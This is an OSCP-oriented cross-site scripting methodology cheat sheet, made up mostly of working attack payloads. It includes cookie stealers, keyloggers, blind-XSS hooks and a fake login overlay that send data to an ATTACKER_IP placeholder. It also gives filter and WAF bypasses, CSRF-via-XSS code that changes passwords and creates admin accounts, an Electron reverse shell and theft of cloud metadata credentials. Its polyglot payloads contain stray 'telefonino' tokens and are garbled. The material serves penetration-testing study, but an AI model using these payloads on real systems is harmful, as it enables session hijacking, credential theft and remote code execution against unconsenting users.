# Cross-Site Scripting (XSS) — Complete OSCP Methodology



---

## Table of Contents

1. [XSS Types & Impact](#1-xss-types--impact)
2. [Detection & Injection Points](#2-detection--injection-points)
3. [Reflected XSS](#3-reflected-xss)
4. [Stored XSS](#4-stored-xss)
5. [DOM-Based XSS](#5-dom-based-xss)
6. [Blind XSS](#6-blind-xss)
7. [Context-Specific Payloads](#7-context-specific-payloads)
8. [Filter & WAF Bypass Techniques](#8-filter--waf-bypass-techniques)
9. [Cookie Theft & Session Hijacking](#9-cookie-theft--session-hijacking)
10. [Advanced Exploitation](#10-advanced-exploitation)
11. [CSP Bypass](#11-csp-bypass)
12. [XSS to RCE Escalation](#12-xss-to-rce-escalation)
13. [Automation & Tools](#13-automation--tools)
14. [Master Checklist](#14-master-checklist)
15. [External References](#15-external-references)

---

## 1. XSS Types & Impact

| Type | Where Payload Lives | When It Executes |
|---|---|---|
| **Reflected** | In the URL / request | When victim clicks the crafted link |
| **Stored** | In the database / server | Every time someone views the page |
| **DOM-based** | Never reaches server | Client-side JS processes the input |
| **Blind** | Stored, but attacker can't see the page | When an admin/user views the page (e.g., support ticket) |

**Impact:**
- Cookie/session theft → account takeover
- Keylogging → credential capture
- Phishing → fake login forms
- Port scanning → internal network recon
- File read → sensitive data
- CSRF → perform actions as victim
- Worm → self-propagating payload
- RCE → via Electron apps, browser exploits, or chained with other vulns

---

## 2. Detection & Injection Points

### Where to Inject

- **URL parameters** — `?search=`, `?q=`, `?name=`, `?redirect=`
- **Form fields** — search boxes, comments, profiles, feedback
- **HTTP headers** — `User-Agent`, `Referer`, `X-Forwarded-For` (stored XSS in logs)
- **File upload** — filename, SVG files, metadata
- **URL path** — `/page/<input>/view`
- **URL fragment** — `#<input>` (DOM XSS)
- **Cookies** — reflected back in responses
- **JSON responses** — `Content-Type: application/json` reflected in HTML
- **Error messages** — 404 pages, error handlers showing input
- **Email fields** — display name, subject (stored in web interface)

### Probe Payloads — Start Simple

```html
<!-- Test for basic reflection -->
<b>test</b>
<i>test</i>
"><b>test</b>
'><b>test</b>

<!-- If HTML tags render, try JS -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- If script is blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Finding the Reflection

```
1. Send a unique string: xss123test456
2. Search the response for that string
3. Note WHERE it appears:
   - Inside HTML tags?
   - Inside an attribute value?
   - Inside JavaScript?
   - Inside a comment?
4. That context determines which payload works
```

---

## 3. Reflected XSS

Payload in the request is reflected in the response.

### Basic Payloads

```html
<script>alert(document.domain)</script>
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
```

### Delivery

```
# Craft the malicious URL
https://target.com/search?q=<script>alert(1)</script>

# URL-encode for delivery
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Shorten the URL to hide the payload
# Use bit.ly or similar
```

---

## 4. Stored XSS

Payload saved in the database, executes for every viewer.

### Common Storage Points

```
- User profile fields (display name, bio, website, location)
- Comments / reviews / feedback forms
- Forum posts / message boards
- Chat messages
- File names (uploaded files displayed in listings)
- Email subject/body (webmail clients)
- Support tickets
- Product descriptions (if user-generated)
- Any field that gets stored and displayed to others
```

### Testing Methodology

```
1. Find a field that stores and displays user input
2. Enter: <b>test</b>
3. View the page where it's displayed
4. If "test" appears bold → HTML renders → try JS
5. Enter: <script>alert(document.domain)</script>
6. View the display page → if alert fires = stored XSS
7. If blocked → apply bypass techniques from section 8
```

### Maximum Impact Stored XSS

```html
<!-- Cookie stealer that runs for every visitor -->
<script>
new Image().src="http://ATTACKER_IP/steal?c="+document.cookie;
</script>

<!-- Keylogger -->
<script>
document.onkeypress=function(e){
  new Image().src="http://ATTACKER_IP/log?k="+e.key;
}
</script>
```

---

## 5. DOM-Based XSS

The vulnerability is in **client-side JavaScript** — the payload never reaches the server.

### Dangerous Sources (Where Input Comes From)

```javascript
document.URL
document.documentURI
document.referrer
document.baseURI
location.href
location.hash       // #fragment — most common
location.search     // ?query
location.pathname
window.name
document.cookie
Web Storage (localStorage, sessionStorage)
postMessage data
```

### Dangerous Sinks (Where Input Goes)

```javascript
// Direct execution
eval()
setTimeout()
setInterval()
Function()
execScript()

// HTML injection
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

// URL-based
location.href
location.assign()
location.replace()
window.open()

// jQuery sinks
$()              // if input starts with <
.html()
.append()
.prepend()
.after()
.before()
$.parseHTML()
```

### Testing DOM XSS

```
1. View page source — search for dangerous sinks
2. Check JavaScript files for source→sink flows
3. Test with:
   https://target.com/page#<img src=x onerror=alert(1)>
   https://target.com/page?default=<script>alert(1)</script>

4. Check browser console for errors (may reveal processing)
5. Use DOM Invader (Burp Suite extension) for automated detection
```

### Common DOM XSS Patterns

```javascript
// Pattern 1: document.write with URL
var pos = document.URL.indexOf("name=") + 5;
document.write(document.URL.substring(pos, document.URL.length));
// Exploit: ?name=<script>alert(1)</script>

// Pattern 2: innerHTML with hash
document.getElementById("output").innerHTML = location.hash.slice(1);
// Exploit: #<img src=x onerror=alert(1)>

// Pattern 3: jQuery selector from URL
$(location.hash);
// Exploit: #<img src=x onerror=alert(1)>

// Pattern 4: eval with user input
var data = decodeURIComponent(location.search.split("=")[1]);
eval(data);
// Exploit: ?param=alert(document.domain)

// Pattern 5: postMessage handler
window.addEventListener("message", function(e) {
    eval(e.data);  // or document.write(e.data)
});
// Exploit: open the page in iframe, postMessage your payload
```

---

## 6. Blind XSS

You inject a payload that fires on a page you never see (admin panel, support dashboard, logs).

### Payloads

```html
<!-- Basic callback -->
<script src=http://ATTACKER_IP/hook.js></script>

<!-- Image beacon -->
<img src=http://ATTACKER_IP/blind?fired=1>

<!-- XSS Hunter style (full page exfil) -->
<script>
var i=new Image();
i.src="http://ATTACKER_IP/blind?cookie="+document.cookie+"&url="+document.URL+"&dom="+btoa(document.body.innerHTML);
</script>

<!-- Polyglot — works in multiple contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telefonino0telefonino1telefonino2telefonino3//</stYle/</titLe/</telefonino/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>

<!-- Inject in common blind XSS targets -->
<!-- Support ticket subject/body -->
<!-- User-Agent header (logged by admin tools) -->
<!-- Referer header -->
<!-- Email display name -->
<!-- Feedback forms -->
```

### XSS Hunter / Callback Server

```bash
# Simple listener
python3 -m http.server 80

# Better — log everything
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(urllib.parse.unquote(self.path))
        print(self.headers)
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 80), H).serve_forever()
"

# Or use XSS Hunter (https://xsshunter.trufflesecurity.com/)
# or interact.sh for hosted callbacks
```

### hook.js (Host on Your Server)

```javascript
// Exfiltrate cookies, URL, and page content
var data = "cookie=" + encodeURIComponent(document.cookie);
data += "&url=" + encodeURIComponent(document.URL);
data += "&dom=" + encodeURIComponent(document.body.innerHTML.substring(0, 2000));
new Image().src = "http://ATTACKER_IP/exfil?" + data;
```

---

## 7. Context-Specific Payloads

### Context 1 — Inside HTML Tags

```html
<!-- Your input appears as: <div>INPUT</div> -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">
```

### Context 2 — Inside an Attribute Value

```html
<!-- Your input appears as: <input value="INPUT"> -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onmouseover=alert(1) x="
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" accesskey="x" onclick="alert(1)

<!-- Single-quoted attribute: <input value='INPUT'> -->
' onmouseover='alert(1)
'><script>alert(1)</script>
```

### Context 3 — Inside href/src Attribute

```html
<!-- Your input appears as: <a href="INPUT"> -->
javascript:alert(1)
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- With URL validation bypass -->
//attacker.com          <!-- protocol-relative URL -->
https://attacker.com
java%0ascript:alert(1)  <!-- newline in "javascript:" -->
```

### Context 4 — Inside JavaScript String

```html
<!-- Your input appears as: var x = 'INPUT'; -->
'; alert(1); //
'; alert(1); var x='
\'; alert(1); //

<!-- Double-quoted: var x = "INPUT"; -->
"; alert(1); //
"; alert(1); var x="

<!-- Inside backticks (template literal): var x = `INPUT` -->
${alert(1)}
`; alert(1); //

<!-- If backslash escaping exists -->
\'; alert(1);//    <!-- escaped ' becomes \\' — the backslash is escaped, quote closes the string -->
</script><script>alert(1)</script>   <!-- break out of script entirely -->
```

### Context 5 — Inside JavaScript Template Literal

```javascript
// Your input appears as: `Hello INPUT`
${alert(1)}
${7*7}    // test first — if 49 appears, template injection confirmed
```

### Context 6 — Inside HTML Comment

```html
<!-- Your input appears as: <!-- INPUT --> -->
--><script>alert(1)</script><!--
--><img src=x onerror=alert(1)><!--
```

### Context 7 — Inside `<script>` Block (No Quotes)

```html
<!-- Your input appears as: var x = INPUT; -->
1; alert(1)
1; alert(1)//
alert(1)
```

### Context 8 — Inside `<style>` or CSS

```html
<!-- Rarely exploitable in modern browsers -->
</style><script>alert(1)</script>
```

---

## 8. Filter & WAF Bypass Techniques

### `<script>` Blocked

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<isindex type=image src=x onerror=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<math><mtext></mtext><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></math>
```

### `alert` Blocked

```html
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>
<img src=x onerror=alert`1`>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self['al'+'ert'](1)>
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=[].constructor.constructor('alert(1)')()>
<img src=x onerror=Function('alert(1)')()>
<img src=x onerror=eval('ale'+'rt(1)')>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=setTimeout('alert(1)')>
<img src=x onerror=setInterval('alert(1)')>
```

### Event Handlers Blocked

```html
<!-- Try lesser-known events -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
<body onpageshow=alert(1)>
<body onresize=alert(1)>    <!-- trigger by resizing window -->
<input onpaste=alert(1)>    <!-- paste something -->
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
```

### Quotes Blocked

```html
<!-- Use backticks -->
<img src=x onerror=alert`1`>

<!-- No quotes needed -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Use String.fromCharCode -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- Use /string/ -->
<img src=x onerror=alert(/XSS/)>
```

### Parentheses Blocked

```html
<!-- Use backticks (template literals) -->
<img src=x onerror=alert`1`>

<!-- Use throw -->
<img src=x onerror="window.onerror=alert;throw 1">

<!-- Use location and hash -->
<img src=x onerror=location='javascript:alert\x281\x29'>
```

### Angle Brackets `< >` Blocked (Reflected in Attribute)

```html
<!-- You're already inside an attribute — use events -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" accesskey="x" onclick="alert(1)
```

### Encoding Bypasses

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<a href="javascript:alert(1)">click</a>
<a href="j&#97;v&#97;script:alert(1)">click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>

<!-- Hex encoding in JS -->
<img src=x onerror=alert('\x58\x53\x53')>

<!-- Unicode encoding in JS -->
<img src=x onerror=alert('XSS')>

<!-- URL encoding (double-encode if needed) -->
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Octal in JS strings -->
<img src=x onerror=alert('\130\123\123')>

<!-- Mixed encoding -->
<a href="&#x6A;avascript:alert(1)">click</a>
```

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<sVg OnLoAd=alert(1)>
```

### Null Bytes & Whitespace

```html
<scr%00ipt>alert(1)</scr%00ipt>
<img/src=x/onerror=alert(1)>     <!-- / instead of space -->
<svg%0aonload=alert(1)>           <!-- newline -->
<svg%09onload=alert(1)>           <!-- tab -->
<svg%0donload=alert(1)>           <!-- carriage return -->
<svg%0conload=alert(1)>           <!-- form feed -->
```

### Polyglot Payloads (Multi-Context)

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0telefonino0telefonino1telefonino2telefonino3//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
```

---

## 9. Cookie Theft & Session Hijacking

### Basic Cookie Stealer

```html
<script>
document.location='http://ATTACKER_IP/steal?c='+document.cookie;
</script>

<script>
new Image().src='http://ATTACKER_IP/steal?c='+document.cookie;
</script>

<script>
fetch('http://ATTACKER_IP/steal?c='+document.cookie);
</script>

<img src=x onerror="this.src='http://ATTACKER_IP/steal?c='+document.cookie">
```

### Bypassing HttpOnly (Cookie Not Accessible via JS)

If `HttpOnly` flag is set, `document.cookie` won't include it. Alternative approaches:

```html
<!-- Use XSS to perform actions AS the user instead of stealing the cookie -->
<!-- CSRF via XSS — the browser sends the cookie automatically -->

<script>
// Change admin password
fetch('/api/change-password', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: 'hacked123'})
});
</script>

<script>
// Add a new admin user
fetch('/api/admin/users', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({username: 'hacker', password: 'pass123', role: 'admin'})
});
</script>

<!-- Read sensitive page and exfiltrate -->
<script>
fetch('/admin/dashboard')
  .then(r => r.text())
  .then(d => fetch('http://ATTACKER_IP/exfil', {method:'POST', body: d}));
</script>
```

### Session Hijacking

```bash
# After stealing cookie, use it:
curl https://target.com/admin -H "Cookie: session=STOLEN_COOKIE_VALUE"

# Or set in browser:
# Open browser console → document.cookie = "session=STOLEN_VALUE"
# Or use a cookie editor extension
```

---

## 10. Advanced Exploitation

### Keylogger

```html
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;
    if (keys.length > 20) {
        new Image().src = 'http://ATTACKER_IP/keys?k=' + encodeURIComponent(keys);
        keys = '';
    }
};
</script>
```

### Phishing — Fake Login Form

```html
<script>
document.body.innerHTML = '<h2>Session expired. Please log in again.</h2>' +
    '<form action="http://ATTACKER_IP/phish" method="POST">' +
    '<input name="username" placeholder="Username"><br>' +
    '<input name="password" type="password" placeholder="Password"><br>' +
    '<button type="submit">Login</button></form>';
</script>
```

### Port Scanner

```html
<script>
// Scan internal network ports from victim's browser
var target = '192.168.1.1';
var ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080, 8443];
ports.forEach(function(port) {
    var img = new Image();
    img.onload = function() {
        new Image().src = 'http://ATTACKER_IP/scan?host=' + target + '&port=' + port + '&status=open';
    };
    img.onerror = function() {
        // May still be open — timing-based detection needed
    };
    img.src = 'http://' + target + ':' + port;
});
</script>
```

### CSRF via XSS

```html
<!-- XSS makes CSRF trivial — bypass all CSRF protections -->
<script>
// Extract CSRF token from page, then use it
fetch('/settings')
  .then(r => r.text())
  .then(html => {
      var token = html.match(/csrf_token.*?value="(.*?)"/)[1];
      fetch('/settings/change-email', {
          method: 'POST',
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: 'email=attacker@evil.com&csrf_token=' + token
      });
  });
</script>
```

### WebSocket Hijacking

```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
    fetch('http://ATTACKER_IP/ws-data', {method: 'POST', body: e.data});
};
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');
};
</script>
```

---

## 11. CSP Bypass

### Check CSP Headers

```bash
curl -sI https://target.com | grep -i content-security-policy

# Common CSP:
# Content-Security-Policy: default-src 'self'; script-src 'self'
```

### CSP Bypass Techniques

```html
<!-- If script-src includes 'unsafe-inline' → normal XSS works -->

<!-- If script-src includes 'unsafe-eval' → eval/setTimeout work -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- If script-src includes a CDN you can abuse -->
<!-- e.g., script-src includes cdn.jsdelivr.net -->
<script src="https://cdn.jsdelivr.net/gh/attacker/repo/evil.js"></script>

<!-- If script-src includes 'nonce-xxx' → find the nonce -->
<!-- Check if nonce is reused across requests (it shouldn't be) -->
<script nonce="KNOWN_NONCE">alert(1)</script>

<!-- base-uri not set → inject <base> tag to redirect script loads -->
<base href="http://ATTACKER_IP/">
<!-- Now relative script src loads from your server -->

<!-- If only default-src 'self' -->
<!-- Try: upload a JS file, then include it -->
<!-- Or: JSONP endpoints on the same origin -->
<script src="/api/callback?cb=alert(1)//"></script>

<!-- Exfiltration when script-src is locked down -->
<!-- Use DNS prefetch -->
<link rel=dns-prefetch href="http://COOKIE.ATTACKER.com">
<!-- Use meta redirect -->
<meta http-equiv="refresh" content="0;url=http://ATTACKER_IP/?c=document.cookie">
<!-- Use CSS to exfil (limited) -->
```

### CSP Evaluator

```
https://csp-evaluator.withgoogle.com/
# Paste the CSP header → shows weaknesses
```

---

## 12. XSS to RCE Escalation

### Electron Apps (Desktop Apps Built with Web Tech)

If the target app is Electron-based and XSS is found:

```html
<script>
// Node.js integration in Electron = RCE
require('child_process').exec('id', function(err, stdout) {
    new Image().src = 'http://ATTACKER_IP/rce?output=' + encodeURIComponent(stdout);
});
</script>

<script>
// Reverse shell from Electron
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"');
</script>
```

### XSS → Admin Access → Upload Webshell

```
1. Steal admin cookie via XSS
2. Log in as admin
3. Find file upload functionality
4. Upload PHP/ASPX webshell
5. Execute commands → reverse shell
```

### XSS → SSRF → Internal Services

```html
<script>
// Use victim's browser as proxy to internal network
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(d => fetch('http://ATTACKER_IP/ssrf', {method: 'POST', body: d}));
</script>
```

### XSS in File Upload (SVG)

```xml
<!-- Upload as image.svg -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>

<!-- SVG with external JS -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script xlink:href="http://ATTACKER_IP/evil.js"/>
</svg>
```

### XSS in File Upload (HTML)

```html
<!-- Upload as file.html or file.htm -->
<html><body><script>alert(document.domain)</script></body></html>
```

---

## 13. Automation & Tools

### Dalfox

```bash
# Install
go install github.com/hahwul/dalfox/v2@latest

# Basic scan
dalfox url "http://target.com/search?q=test"

# Pipe from other tools
cat urls.txt | dalfox pipe

# With custom payloads
dalfox url "http://target.com/search?q=test" --custom-payload payloads.txt

# Blind XSS with callback
dalfox url "http://target.com/search?q=test" --blind "http://ATTACKER_IP"
```

### XSStrike

```bash
# Install
git clone https://github.com/s0md3v/XSStrike.git
pip3 install -r requirements.txt

# Basic scan
python3 xsstrike.py -u "http://target.com/search?q=test"

# POST data
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# With headers
python3 xsstrike.py -u "http://target.com/search?q=test" --headers "Cookie: session=abc"

# Crawl mode
python3 xsstrike.py -u "http://target.com" --crawl
```

### Burp Suite

```
1. Proxy traffic → Spider/Crawl the app
2. Right-click request → Send to Intruder
3. Mark the parameter → Load XSS payload list
4. Grep match for: alert(, onerror=, onload=, <script
5. Check reflected payloads manually

BApp Store extensions:
- Reflected Parameters
- Active Scan++
- DOM Invader (built into Burp's browser)
```

### Payload Lists

```bash
# SecLists XSS payloads
/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
/usr/share/seclists/Fuzzing/XSS/XSS-RSNAKE.txt
/usr/share/seclists/Fuzzing/XSS/XSS-Vectors-Mario.txt
```

---

## 14. Master Checklist

### Detection

- [ ] Test every URL parameter with `<b>test</b>` and `"><b>test</b>`
- [ ] Test every form field (search, comment, profile, feedback)
- [ ] Test URL path segments
- [ ] Test HTTP headers (User-Agent, Referer) — check if reflected in response
- [ ] Test URL fragment (`#payload`) — view page source/JS for DOM sinks
- [ ] Test file upload filenames
- [ ] Identify the reflection context (HTML, attribute, JS, comment)
- [ ] Test with unique canary string first, find where it appears

### Reflected XSS

- [ ] `<script>alert(1)</script>` — basic test
- [ ] `"><script>alert(1)</script>` — break out of attribute
- [ ] `<img src=x onerror=alert(1)>` — if `<script>` blocked
- [ ] `<svg onload=alert(1)>` — alternative tag
- [ ] Test URL-encoded versions
- [ ] Test context-specific payloads (section 7)

### Stored XSS

- [ ] Test all profile fields (name, bio, website, location)
- [ ] Test comment/review/feedback forms
- [ ] Test file upload filenames
- [ ] Test with `<script src=http://ATTACKER/hook.js></script>`
- [ ] Check if other users/admin will see the payload

### DOM XSS

- [ ] Search JS files for dangerous sinks (innerHTML, eval, document.write)
- [ ] Test `location.hash` with `#<img src=x onerror=alert(1)>`
- [ ] Test `location.search` parameters
- [ ] Use DOM Invader (Burp) for automated detection
- [ ] Check for `postMessage` handlers

### Blind XSS

- [ ] Inject callback payloads in support tickets
- [ ] Inject in User-Agent header
- [ ] Inject in feedback/contact forms
- [ ] Inject in any field admin might view
- [ ] Use XSS Hunter or custom callback server

### Filter Bypass

- [ ] If `<script>` blocked → event handler tags (`<img>`, `<svg>`, `<body>`)
- [ ] If `alert` blocked → `confirm`, `prompt`, `print`, encoding
- [ ] If quotes blocked → backticks, no quotes, `String.fromCharCode`
- [ ] If parentheses blocked → backticks, `throw`
- [ ] If angle brackets blocked → attribute-based payload
- [ ] Try HTML entity encoding, hex, unicode, URL encoding
- [ ] Try case variation
- [ ] Try null bytes / whitespace characters between tag and event
- [ ] Try polyglot payloads

### Exploitation

- [ ] Steal cookies: `new Image().src='http://ATTACKER/?c='+document.cookie`
- [ ] If HttpOnly → perform actions as user instead (CSRF via XSS)
- [ ] Keylogger payload
- [ ] Phishing overlay
- [ ] Read sensitive pages and exfiltrate
- [ ] Extract CSRF tokens
- [ ] Check for admin functionality accessible via XSS

### CSP

- [ ] Check CSP header: `curl -sI target.com | grep -i csp`
- [ ] Evaluate with csp-evaluator.withgoogle.com
- [ ] Check for `unsafe-inline`, `unsafe-eval`
- [ ] Check for abusable CDN sources
- [ ] Check for JSONP endpoints on same origin
- [ ] Try `<base>` tag injection if base-uri not set
- [ ] Try DNS prefetch / meta redirect for exfil

### Escalation

- [ ] XSS → cookie theft → account takeover
- [ ] XSS → admin access → file upload → webshell → RCE
- [ ] XSS → SSRF to internal services
- [ ] XSS → read sensitive internal pages
- [ ] Check if target is Electron app (→ direct RCE)

---

## 15. External References

- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HackTricks — XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
- [OWASP — XSS](https://owasp.org/www-community/attacks/xss/)
- [XSS Hunter](https://xsshunter.trufflesecurity.com/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Dalfox](https://github.com/hahwul/dalfox)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [DOM Invader — Burp Suite](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [Brute Logic XSS Payloads](https://brutelogic.com.br/blog/)
